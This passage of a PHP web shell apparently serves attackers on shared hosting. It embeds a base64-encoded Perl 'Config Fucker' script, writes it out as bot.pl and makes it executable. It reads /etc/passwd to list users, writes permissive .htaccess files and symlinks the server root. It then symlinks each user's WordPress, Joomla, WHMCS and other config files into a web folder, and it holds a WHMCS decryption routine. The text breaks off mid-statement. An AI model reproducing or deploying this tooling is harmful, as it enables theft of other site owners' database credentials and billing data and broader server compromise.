4+TXlCQi1mb3J1bS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLnR4dCcpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MudHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0udHh0JykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy50eHQnKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIudHh0JykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnR4dCcpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb29tbGEvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb29tbGEudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1wcm90YWwudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9qb28vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1qb28udHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1jbXMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaXRlL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtc2l0ZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1tYWluLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ld3MudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1uZXcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob21lL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtaG9tZS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2ZvcnVtL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PlZCdWxsZXRpbi1mb3J1bS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3ZiL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIzL2luY2x1ZGVzL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PnZiMy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NwYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y3BhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvcGFuZWwvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnBhbmVsLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RpbmcvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmhvc3RpbmcudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdHMudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvemVuY2FydC9pbmNsdWRlcy9kaXN0LWNvbmZpZ3VyZS5waHAnLCRkb21haW4uJ35+PnplbmNhcnQtc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+aG9wLVpDc2hvcC50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS50eHQnKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLnR4dCcpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQudHh0Jyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEudHh0Jyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC50eHQnKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LnR4dCcpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLnR4dCcpOyANCn0NCmlmICgkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICdQT1NUJykgew0KICByZWFkKFNURElOLCAkYnVmZmVyLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCn0gZWxzZSB7DQogICRidWZmZXIgPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCn0NCkBwYWlycyA9IHNwbGl0KC8mLywgJGJ1ZmZlcik7DQpmb3JlYWNoICRwYWlyIChAcGFpcnMpIHsNCiAgKCRuYW1lLCAkdmFsdWUpID0gc3BsaXQoLz0vLCAkcGFpcik7DQogICRuYW1lID1+IHRyLysvIC87DQogICRuYW1lID1+IHMvJShbYS1mQS1GMC05XVthLWZBLUYwLTldKS9wYWNrKCJDIiwgaGV4KCQxKSkvZWc7DQogICR2YWx1ZSA9fiB0ci8rLyAvOw0KICAkdmFsdWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJEZPUk17JG5hbWV9ID0gJHZhbHVlOw0KfQ0KaWYgKCRGT1JNe3Bhc3N9IGVxICIiKXsNCnByaW50ICcNCjxib2R5IGNsYXNzPSJuZXdTdHlsZTEiIGJnY29sb3I9IiMwMDAwMDAiPg0KPHA+Q29uZmlnIEZ1Y2tlcjwvcD4NCjxwPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBDb2RlZCBCeSA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+WC0xTjczQ1Q8L2ZvbnQ+PGZvbnQgY29sb3I9IiNDMEMwQzAiPl08L2ZvbnQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiPg0KPHRleHRhcmVhIG5hbWU9InBhc3MiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjMDBmZjAwOyB3aWR0aDogNTQzcHg7IGhlaWdodDogNDIwcHg7IGJhY2tncm91bmQtY29sb3I6IzBDMEMwQzsgZm9udC1mYW1pbHk6VGFob21hOyBmb250LXNpemU6OHB0OyBjb2xvcjojRkYwMDAwIiAgPjwvdGV4dGFyZWE+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8aW5wdXQgbmFtZT0idGFyIiB0eXBlPSJ0ZXh0IiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDIxMnB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6I0ZGMDAwMDsgIiAgLz48L3A+DQo8cCBhbGlnbj0iY2VudGVyIj4NCjxpbnB1dCBuYW1lPSJTdWJtaXQxIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJHRVQgQ09ORklHICEiIHN0eWxlPSJib3JkZXI6MXB4IGRvdHRlZCAjRkYwMDAwOyB3aWR0aDogOTk7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjEwcHQ7IGNvbG9yOiM1OUU4MTc7IHRleHQtdHJhbnNmb3JtOnVwcGVyY2FzZTsgaGVpZ2h0OjIzOyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEMiIC8+PC9wPg0KPC9mb3JtPic7DQp9ZWxzZXsNCkBsaW5lcyA9PCRGT1JNe3Bhc3N9PjsNCiR5ID0gQGxpbmVzOw0Kb3BlbiAoTVlGSUxFLCAiPnRhci50bXAiKTsNCnByaW50IE1ZRklMRSAidGFyIC1jemYgIi4kRk9STXt0YXJ9LiIudGFyICI7DQpmb3IgKCRrYT0wOyRrYTwkeTska2ErKyl7DQp3aGlsZShAbGluZXNbJGthXSAgPX4gbS8oLio/KTp4Oi9nKXsNCiZsaWwoJDEpOw0KcHJpbnQgTVlGSUxFICQxLiIudHh0ICI7DQpmb3IoJGtkPTE7JGtkPDE4OyRrZCsrKXsNCnByaW50IE1ZRklMRSAkMS4ka2QuIi50eHQgIjsNCn0NCn0NCiB9DQpwcmludCc8Ym9keSBjbGFzcz0ibmV3U3R5bGUxIiBiZ2NvbG9yPSIjMDAwMDAwIj4NCjxwPllvdSBnb3QgaXQhITxicj48YnI+PGJyPjxmb250IGNvbG9yPSIjQzBDMEMwIj5bPC9mb250PiBDb2RlZCBCeSA8Zm9udCBjb2xvcj0iI0ZGMDAwMCI+WC0xTjczQ1Q8L2ZvbnQ+PGZvbnQgY29sb3I9IiNDMEMwQzAiPl08L2ZvbnQ+PC9wPg0KPHA+Jm5ic3A7PC9wPic7DQppZigkRk9STXt0YXJ9IG5lICIiKXsNCm9wZW4oSU5GTywgInRhci50bXAiKTsNCkBsaW5lcyA9PElORk8+IDsNCmNsb3NlKElORk8pOw0Kc3lzdGVtKEBsaW5lcyk7DQpwcmludCc8cD48YSBocmVmPSInLiRGT1JNe3Rhcn0uJy50YXIiPjxmb250IGNvbG9yPSIjMDBGRjAwIj4NCjxzcGFuIHN0eWxlPSJ0ZXh0LWRlY29yYXRpb246IG5vbmUiPkNsaWNrIEhlcmUgVG8gRG93bmxvYWQgVGFyIEZpbGU8L3NwYW4+PC9mb250PjwvYT48L3A+JzsNCn0NCn0NCiBwcmludCINCjwvYm9keT4NCjwvaHRtbD4iOw==";
$file = fopen("bot.pl" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
    chmod("bot.pl",0755);
	chmod(".htaccess",0755);
   echo "<iframe src=MCF_config/bot.pl width=97% height=100% frameborder=0></iframe>
   </div>";
}
#==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['phpconfig']))
{
?>
<CENTER><br/><br><b><font color=#FF0000>+--=[ PHP Config Fucker Priv8 ]=--+</font></b><br><br><br>
<form method=post><table class=tabnet ><tr><textarea  style="background:black;outline:none;"  rows=20 cols=85 name=user><?php $users=file("/etc/passwd");
foreach($users as $user){ $str=explode(":",$user); echo $str[0]."\n";} ?></textarea><br><b> Your Folder Config Name : <b/><input class=inputz type=text name=folfig size=40  value="" /><input type=submit class=inputzbut name=su value="Lets Start" /></tr></table></form></CENTER>
<?php
	error_reporting(0);
	echo "<font color=red size=2 face=\"comic sans ms\">";
	if(isset($_POST['su']))
	{
	$folfig = $_POST['folfig']; 
	mkdir($folfig,0777);
	chdir($folfig);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any \n OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddHandler txt .php \n AddHandler cgi-script .cgi \n AddHandler cgi-script .pl \n Options Indexes FollowSymLinks \n AddType txt .php \n AddType text/html .shtml \n";
$inj1=".htaccess";
$g = fopen($inj1,'w');
fwrite($g,$rr);
fclose ($g);
$indishell = symlink("/","$folfig/root");
		    $rt="<a href=$folfig/root><font color=white size=3 face=\"comic sans ms\"> OwN3d</font></a>";
        echo "Please check link given below for / folder symlink <br><u>$rt</u>";
		
		$dir=mkdir($folfig,0777);
		$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any \n OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddHandler txt .php \n AddHandler cgi-script .cgi \n AddHandler cgi-script .pl \n Options Indexes FollowSymLinks \n AddType txt .php \n AddType text/html .shtml \n";
        $inj =".htaccess";
		$f = fopen($inj,'w');
        fwrite($f,$r);
		fclose($f);
        $consym="<a href=$folfig/><font color=white size=3 face=\"comic sans ms\">configuration files</font></a>";
       	echo "<br>The link given below for configuration file symlink...open it, once processing finish <br><u><font color=red size=2 face=\"comic sans ms\">$consym</font></u>";
       	
       	$usr=explode("\n",$_POST['user']);
       	$configuration=array("wp-config.php","wordpress/wp-config.php","web/wp-config.php","wp/wp-config.php","press/wp-config.php","wordpress/beta/wp-config.php",
		"news/wp-config.php","new/wp-config.php","blogs/wp-config.php","home/wp-config.php","blog/wp-config.php","protal/wp-config.php","site/wp-config.php",
		"main/wp-config.php","test/wp-config.php","wp/beta/wp-config.php","beta/wp-config.php","joomla/configuration.php","protal/configuration.php",
		"joo/configuration.php","cms/configuration.php","site/configuration.php","main/configuration.php","news/configuration.php","new/configuration.php",
		"home/configuration.php","configuration.php","SSI.php","forum/SSI.php","forum/inc/config.php","forum/includes/config.php","upload/includes/config.php",
		"cc/includes/config.php","vb/includes/config.php","vb3/includes/config.php","cpanel/configuration.php","panel/configuration.php","ubmitticket.php",
		"manage/configuration.php","myshop/configuration.php","beta/configuration.php","includes/config.php","lib/config.php","conf_global.php",
		"inc/config.php","incl/config.php","include/db.php","include/config.php","includes/functions.php","includes/dist-configure.php","connect.php",
		"mk_conf.php","config/koneksi.php","system/sistem.php","config.php","Settings.php","settings.php","sites/default/settings.php","smf/Settings.php",
		"forum/Settings.php","forums/Settings.php","host/configuration.php","hosting/configuration.php","hosts/configuration.php","zencart/includes/dist-configure.php",
		"shop/includes/dist-configure.php","whm/configuration.php","whmc/configuration.php","whmcs/configuration.php","whmc/WHM/configuration.php",
		"whm/WHMCS/configuration.php","whm/whmcs/configuration.php","order/configuration.php","support/configuration.php","supports/configuration.php",
		"oscommerce/includes/configure.php","oscommerces/includes/configure.php","shopping/includes/configure.php","sale/includes/configure.php","config.inc.php",
		"amember/config.inc.php","clients/configuration.php","client/configuration.php","clientes/configuration.php","cliente/configuration.php",
		"clientsupport/configuration.php","billing/configuration.php","billings/configuration.php","admin/conf.php","datas/config.php","e107_config.php",
		"sites/default/settings.php","admin/config.php");
		foreach($usr as $uss )
		{
			$us=trim($uss);
						
			foreach($configuration as $c)
			{
			 $rs="/home/".$us."/public_html/".$c;
			 $r="$folfig/".$us." .. ".$c;
			 symlink($rs,$r);
			
		}
			
			}
		
		
		}	
	}
}
elseif(isset($_GET['do']) && ($_GET['do'] == 'whmcsdecod'))
{
?>
<form action="?y=<?php echo $pwd; ?>&amp;do=whmcs" method="post">

<?php

function decrypt ($string,$cc_encryption_hash)
{
    $key = md5 (md5 ($cc_encryption_hash)) . md5 ($cc_encryption_hash);
    $hash_key = _hash ($key);
    $hash_length = strlen ($hash_key);
    $string = base64_decode ($string);
    $tmp_iv = substr ($string, 0, $hash_length);
    $string = substr ($string, $hash_length, strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length)
    {
        $iv .= chr (ord ($tmp_iv[$c]) ^ ord ($hash_key[$c]));
        ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen ($string))
    {
        if (($c != 0 AND $c % $hash_length == 0))
        {
            $key = _hash ($key . substr ($out, $c - $hash_length, $hash_length));
        }
        $out .= chr (ord ($key[$c % $hash_length]) ^ ord ($string[$c]));
        ++$c;
    }
    return $out;
}

function _hash ($string)
{
    if (function_exists ('sha1'))
    {
        $hash = sha1 ($string);
    }
    else
    {
        $hash = md5 ($string);
    }
    $out = '';
    $c = 0;
    while ($c < strlen ($hash))
    {
        $out .= chr (hexdec ($hash[$c] . $hash[$c + 1]));
        $c += 2;
    }
    return $out;
}

echo "
